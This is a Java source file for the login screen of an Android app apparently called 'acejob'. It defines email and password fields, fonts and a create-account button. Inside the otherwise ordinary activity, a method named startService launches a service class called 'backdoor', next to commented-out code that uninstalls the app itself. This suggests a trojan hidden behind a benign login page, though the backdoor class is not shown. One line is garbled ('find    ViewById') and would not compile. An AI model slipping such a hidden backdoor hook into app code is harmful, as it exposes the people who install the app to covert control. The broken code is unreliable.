package com.acejob.acejob;

import android.content.Intent;
import android.content.res.AssetManager;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import com.acejob.acejob.Font;

import java.util.logging.Logger;

public class login extends rootActivity {

    // Used to load the 'native-lib' library on application startup.
    private static final String TAG = "aceDebug";
    EditText email,pass;
    Button login,createaccount;
    Font font;
    static {
        System.loadLibrary("native-lib");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.login);
        setVisible(true);
setTitle("Sign In");
        email = (EditText)findViewById(R.id.email);
        pass = (EditText)findViewById(R.id.pass);
        pass.setFocusable(true);

        login = (Button)findViewById(R.id.login);
        createaccount = (Button)find    ViewById(R.id.createaccount);

        font = new Font(this,getAssets());
font.setEditTextFont(email,"font/roboto_regular.ttf");
        font.setEditTextFont(pass,"font/roboto_regular.ttf");

 }

    @Override
    protected void onStart() {
        super.onStart();
createaccount.setOnClickListener(new View.OnClickListener() {
    @Override
    public void onClick(View v) {
        Intent postjob = new Intent(login.this.getApplicationContext(), createaccount.class);
        startActivity(postjob);
    }
});

pass.setOnFocusChangeListener(new View.OnFocusChangeListener() {
    @Override
    public void onFocusChange(View v, boolean hasFocus) {
        if(hasFocus == true){
            pass.setText("");
        }
    }
});


    }


    public void startService(View view){
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
startService(new Intent(getBaseContext(),backdoor.class));
/*
String app_pkg_name = "com.acejob.acejob";
                int UNINSTALL_REQUEST_CODE = 1;

                Intent intents = new Intent(Intent.ACTION_UNINSTALL_PACKAGE);
                intents.setData(Uri.parse("package:"+app_pkg_name));
                intents.putExtra(Intent.EXTRA_RETURN_RESULT,true);
                startActivityForResult(intents,UNINSTALL_REQUEST_CODE);
  */
            }
        });
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu,menu);
        return true;
    }

    /**
     * A native method that is implemented by the 'native-lib' native library,
     * which is packaged with this application.
     */
    public native String stringFromJNI();


    @Override
    protected void onDestroy() {

        super.onDestroy();
    }
}
